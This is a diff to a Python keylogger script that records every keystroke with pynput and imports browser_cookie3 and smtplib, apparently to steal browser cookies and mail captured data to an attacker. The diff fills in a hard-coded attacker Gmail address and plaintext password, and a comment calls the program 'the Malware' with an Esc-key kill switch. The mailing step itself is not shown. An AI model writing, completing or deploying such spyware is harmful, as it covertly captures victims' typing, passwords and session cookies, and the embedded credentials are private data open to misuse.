@@ -1,27 +1,26 @@
 from pynput import keyboard
 import browser_cookie3
 import os 
-import json
 import smtplib
+import time 
 
-
-hackers_email = '______'
-hackers_pw = '______'
+hackers_email = 'scumbag.hacker6841@gmail.com'
+hackers_pw = 'Python1029'
 
 keylogs = []
 def on_press(key):
     try:
         #Writes alphanumerical characters to our log file
-        keylogs.append('{0}\n'.format(key.char))
+        keylogs.append('{0}'.format(key.char))
     except AttributeError:
         #Since pynput will throw an attribute error when typing a special key i.e holding shift
         #The exception will catch this and still write to our log file
-        keylogs.append('{0}\n'.format(key))
+        keylogs.append('{0}'.format(key))
 def on_release(key):
+    #This is used as a backdoor functionality to termiante the Malware. 
     if key == keyboard.Key.esc:
-        #logs.close()
-        # Stop listener
         return False
+    
     
 
 # Collect events until released
